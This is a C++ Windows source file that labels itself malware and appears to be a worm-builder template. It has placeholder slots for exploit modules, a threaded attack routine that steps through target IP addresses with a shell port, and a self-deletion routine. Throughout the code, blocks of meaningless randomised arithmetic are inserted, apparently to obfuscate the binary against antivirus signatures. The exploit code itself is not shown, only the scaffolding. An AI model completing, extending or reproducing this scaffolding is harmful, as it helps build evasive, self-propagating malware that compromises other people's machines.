#include "test2.h"
bool isRandomName = false;
typedef struct threadData {
	int shellPort;
	char strIP[16];
} threadData, *PthreadData;
//Global var: malware file name
char fullName[MAX_PATH];
std::string fileName ="";

int main(int argc, char** argv){
	
	GetModuleFileNameA(NULL, (LPSTR)fullName, 100);
	fileName = PathFindFileNameA(fullName);

	//[ninjaModule]
	if(argc==0){/*normal process*/
	//[moduleThreads]
	
	//[mainExploit]	

	}
	//[optionElseIf]
	else{
		SelfDelete();
		return 0;
	}
}
//WinMain for win app compile in visual studio
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	int argc;
	PCHAR *argv = CommandLineToArgvA(lpCmdLine, &argc);

	return main(argc, argv);
}

void SelfDelete(){
	char out[MAX_PATH];
	GetModuleFileNameA(NULL,(LPSTR)out,100);
	char str[MAX_PATH];
	strcpy(str,"start del ");
	strcat(str,out);
	system(str);
}
PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc)
{
	PCHAR* argv;
	PCHAR  _argv;
int iCxQICK24JX = 0xf6edd08;
int idvceYhDeGd = 0xba69a70;
int ikhT7l2ctWK = 0x3a1c50d;
int ikjhyhPNBrP = iCxQICK24JX + idvceYhDeGd - ikhT7l2ctWK;
ikjhyhPNBrP = 0x5e9e321 * ikjhyhPNBrP + 0xf4301e3 - idvceYhDeGd;
int iTyGjyzF78I = ikjhyhPNBrP / 0xf4301e3 + iCxQICK24JX ^ ikhT7l2ctWK - 0x3a1c50d;

	ULONG   len;
int itzBv4eghKP;
int iIw5lb9zyfG = 0xc5c2968;
int ieoLEtJuXMW = 0xd49cfa6;
int iTUFoey5WZh = 0x7c605c6;
for(itzBv4eghKP = 0; itzBv4eghKP < 3; itzBv4eghKP++)
{
    iIw5lb9zyfG = itzBv4eghKP * 99 - 1000 * ieoLEtJuXMW + 0x456 ^ 0xf7921e2 % 5 - 0x626d45d;
    ieoLEtJuXMW = itzBv4eghKP * 3 + iTUFoey5WZh + 0x30 + 0x7c605c6 % 123 - ieoLEtJuXMW;
    iTUFoey5WZh = itzBv4eghKP * 4 - 0xd49cfa6 + 0xff / 0x123 - 0x7c605c6 % 234 - 0x626d45d;
}
int iQT9hS7NKVf = iTUFoey5WZh - iIw5lb9zyfG * ieoLEtJuXMW + 0x7c605c6;
iQT9hS7NKVf = itzBv4eghKP - 50 + 100 - 0xd49cfa6 ^ 99 * 0x0f - 0x7c605c6 % 2 - 3575 + 0x626d45d;

	ULONG   argc;
	CHAR   a;
	ULONG   i, j;

	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;
	BOOLEAN  in_SPACE;

	len = strlen(CmdLine);
	i = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);
int ixH8LlfQ6Ds;
int ibcBKvka8LQ = 0x5eb4b10;
int i0JHoWCkMXr = 0x97c4466;
int ibGIvKsLdDQ = 0x83a418d;
for(ixH8LlfQ6Ds = 0; ixH8LlfQ6Ds < 3; ixH8LlfQ6Ds++)
{
    ibcBKvka8LQ = ixH8LlfQ6Ds * 99 - 1000 * i0JHoWCkMXr + 0x456 ^ 0x65cf686 % 5 - 0x180c9f4;
    i0JHoWCkMXr = ixH8LlfQ6Ds * 3 + ibGIvKsLdDQ + 0x30 + 0x83a418d % 123 - i0JHoWCkMXr;
    ibGIvKsLdDQ = ixH8LlfQ6Ds * 4 - 0x97c4466 + 0xff / 0x123 - 0x83a418d % 234 - 0x180c9f4;
}
int ie8hTO92BsT = ibGIvKsLdDQ - ibcBKvka8LQ * i0JHoWCkMXr + 0x83a418d;
ie8hTO92BsT = ixH8LlfQ6Ds - 50 + 100 - 0x97c4466 ^ 99 * 0x0f - 0x83a418d % 2 - 3575 + 0x180c9f4;


	argv = (PCHAR*)GlobalAlloc(GMEM_FIXED,
		i + (len + 2) * sizeof(CHAR));

	_argv = (PCHAR)(((PUCHAR)argv) + i);

	argc = 0;
	argv[argc] = _argv;
	in_QM = FALSE;
	in_TEXT = FALSE;
	in_SPACE = TRUE;
	i = 0;
	j = 0;

	while (a = CmdLine[i]) {
		if (in_QM) {
			if (a == '\"') {
				in_QM = FALSE;
			}
			else {
				_argv[j] = a;
				j++;
			}
		}
		else {
			switch (a) {
			case '\"':
				in_QM = TRUE;
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
int iAp4CQ0T5BL = 0xeaa0988;
int i3aYVkfnABQ = 0x673600c;
int iSdUgSakUca = 0x31b5efa;
int iugshiyJp9d = iSdUgSakUca * i3aYVkfnABQ + iAp4CQ0T5BL;
i3aYVkfnABQ = 0x00da843 + iugshiyJp9d + 0x925741f + iAp4CQ0T5BL;
int itCfg8NFAz3 = iAp4CQ0T5BL / 0x673600c - iSdUgSakUca ^ iSdUgSakUca ^ 0x31b5efa;

				}
				in_SPACE = FALSE;
				break;
			case ' ':
			case '\t':
			case '\n':
			case '\r':
				if (in_TEXT) {
					_argv[j] = '\0';
					j++;
				}
				in_TEXT = FALSE;
				in_SPACE = TRUE;
				break;
			default:
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				_argv[j] = a;
				j++;
				in_SPACE = FALSE;
				break;
			}
		}
		i++;
int iONDhkBS0Ei = 0x5766f9a;
int igzpfpe3rur = 0x22e962b;
int iXnuSkC2Vwp = 0xf313854;
int iEt7jFWaBSp = iONDhkBS0Ei + igzpfpe3rur - iXnuSkC2Vwp;
iEt7jFWaBSp = 0xfda168c * iEt7jFWaBSp + 0xd638b32 - igzpfpe3rur;
int iWeJd75QnhQ = iEt7jFWaBSp / 0xd638b32 + iONDhkBS0Ei ^ iXnuSkC2Vwp - 0xf313854;

	}
	_argv[j] = '\0';
	argv[argc] = NULL;

	(*_argc) = argc;
	return argv;
}
void initAttack(int ipAddress[]){
	
	register int i,j;
	u_long opt = 1;

	PthreadData pDataArray[MAX_THREADS];
    DWORD   dwThreadIdArray[MAX_THREADS];
    HANDLE  hThreadArray[MAX_THREADS]; 
    int curIP[4];
	
	//[exploitThreads]

    //Increase IP when all exploit done
	ipAddress[0]=curIP[0];
    ipAddress[1]=curIP[1];
    ipAddress[2]=curIP[2];
    ipAddress[3]=curIP[3];
}

//[exploit_function]

void ipAr2Str(int ipAddress[],char* result){
	int tmp[4];
	tmp[0] = ipAddress[0];
	tmp[1] = ipAddress[1];
	tmp[2] = ipAddress[2];
	tmp[3] = ipAddress[3];
int i91YDae3pDu = 0xa80bf81;
int igZau9JDJOO = 0xef46d62;
int iMxxPiPHLaT = i91YDae3pDu | igZau9JDJOO;

	sprintf(result, "%i.%i.%i.%i",ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
	// printf("%s\n",result);
	return;
}
